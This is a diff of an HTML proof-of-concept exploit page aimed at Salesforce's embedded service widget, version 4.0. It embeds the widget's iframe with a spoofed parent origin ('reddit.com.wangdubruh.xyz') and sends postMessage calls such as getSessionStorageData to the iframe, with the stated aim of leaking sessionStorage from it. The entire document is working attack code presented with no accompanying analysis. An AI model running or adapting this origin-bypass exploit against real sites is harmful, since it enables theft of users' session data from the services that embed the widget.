@@ -1,58 +1,66 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Salesforce 4.0 Origin Bypass PoC</title>
-    <style>
-      body { font-family: sans-serif; padding: 1rem; }
-      iframe { width: 600px; height: 400px; border: 1px solid #ccc; }
-    </style>
-  </head>
-  <body>
-    <h3>Salesforce Iframe Origin Bypass PoC (v4.0)</h3>
-    <p>Check console for iframe responses.</p>
+<head>
+  <title>Salesforce v4.0 Origin Bypass PoC</title>
+  <style>
+    body {
+      font-family: monospace;
+      background: #111;
+      color: #0f0;
+      padding: 1rem;
+    }
+    iframe {
+      width: 100%;
+      height: 400px;
+      border: 1px solid #0f0;
+    }
+  </style>
+</head>
+<body>
+  <h2>[+] Salesforce v4.0 Origin Bypass PoC</h2>
+  <p>Check the console for leaked sessionStorage or errors.</p>
 
-    <iframe
-      id="sf-iframe"
-      name="https://ads.reddit.com"
-      src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://ads.reddit.com.wangdubruh.xyz"
-    ></iframe>
+  <iframe
+    id="sf-frame"
+    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
+  ></iframe>
 
-    <script>
-      const iframe = document.getElementById("sf-iframe");
+  <script>
+    const iframe = document.getElementById("sf-frame");
 
-      iframe.onload = () => {
-        console.log("[+] Iframe loaded (v4.0)");
+    iframe.onload = () => {
+      console.log("[+] Iframe loaded (Salesforce 4.0)");
 
-        // Send test messages
-        setTimeout(() => {
-          const testMessages = [
-            {
-              method: "getSessionStorageData",
-              domain: "ads.reddit.com",
-              deploymentId: "test123"
-            },
-            {
-              method: "session.updateStorage",
-              domain: "ads.reddit.com",
-              data: {
-                deploymentId: "test123",
-                isSamePageNavigation: true,
-                isRefresh: false
-              }
+      // Send messages after iframe is ready
+      setTimeout(() => {
+        const messages = [
+          {
+            method: "getSessionStorageData",
+            domain: "reddit.com.wangdubruh.xyz", // <-- must match your page origin
+            deploymentId: "test123"
+          },
+          {
+            method: "session.updateStorage",
+            domain: "reddit.com.wangdubruh.xyz",
+            data: {
+              deploymentId: "test123",
+              isSamePageNavigation: true,
+              isRefresh: false
             }
-          ];
+          }
+        ];
 
-          testMessages.forEach((msg, i) => {
-            console.log(`[📤] Sending message ${i + 1}:`, msg);
-            iframe.contentWindow.postMessage(msg, "*");
-          });
-        }, 1000);
-      };
+        messages.forEach((msg, i) => {
+          console.log(`[📤] Sending message ${i + 1}:`, msg);
+          iframe.contentWindow.postMessage(msg, "*");
+        });
+      }, 1000);
+    };
 
-      // Log iframe replies
-      window.addEventListener("message", (event) => {
-        console.log("[📩] Message from iframe:", event.data);
-      });
-    </script>
-  </body>
+    // Listen for responses
+    window.addEventListener("message", (e) => {
+      console.log("[📩] Message from iframe:", e.data);
+    });
+  </script>
+</body>
 </html>
